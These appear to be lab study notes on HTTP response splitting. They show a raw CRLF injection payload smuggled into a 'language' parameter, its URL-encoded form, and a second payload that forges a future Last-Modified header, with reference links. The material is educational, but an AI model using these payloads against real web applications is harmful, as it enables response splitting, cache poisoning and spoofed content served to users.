# HTTP SPLITTING

## (part 1)

Using [urlencoder](https://www.urlencoder.org/) under 'destination newline seperator' select 'Unix'

```
language=enContent-Length: 0HTTP/1.1 200 OKContent-Type: text/htmlContent-Length: 10Test
```

turns to

```
language%3Den%0AContent-Length%3A%200%0A%0AHTTP%2F1.1%20200%20OK%0AContent-Type%3A%20text%2Fhtml%0AContent-Length%3A%2010%0A%3Chtml%3ETest%3C%2Fhtml%3E%0A%0A
```

Note: 
But you will notice that using the `%0a` works while `%0a%0d` doesn't. This is due to the underlying os environment that the application is running on: windows uses two characters for the *CR LF* sequence, while unix only uses *LF*.

| Environment | CRLF Used | encoded |
| ----------- | --------- | ------- |
| Windows     | CRLF      | %0d%0a  |
| Unix        | LF        | %0a     |

[https://stackoverflow.com/questions/1552749/difference-between-cr-lf-lf-and-cr-line-break-types](https://stackoverflow.com/questions/1552749/difference-between-cr-lf-lf-and-cr-line-break-types)

### CRLF / HTTP header injection

[https://owasp.org/www-community/attacks/HTTP_Response_Splitting](https://owasp.org/www-community/attacks/HTTP_Response_Splitting)

[https://portswigger.net/kb/issues/00200200_http-response-header-injection](https://portswigger.net/kb/issues/00200200_http-response-header-injection)

### log poisoning using CRLF

[https://www.netsparker.com/blog/web-security/crlf-http-header/](https://www.netsparker.com/blog/web-security/crlf-http-header/)

## (part 2)

Note: inject the `Last-Modified` date to a future date which forces the browser to send an `If-Modified-Since` request header to future requests *encode uri for below*

```
language=enContent-Length: 0HTTP/1.1 200 OKContent-Type: text/htmlLast-Modified: Fri, 1 Jan 2030 00:00:00 GMTContent-Length: 4Test
```
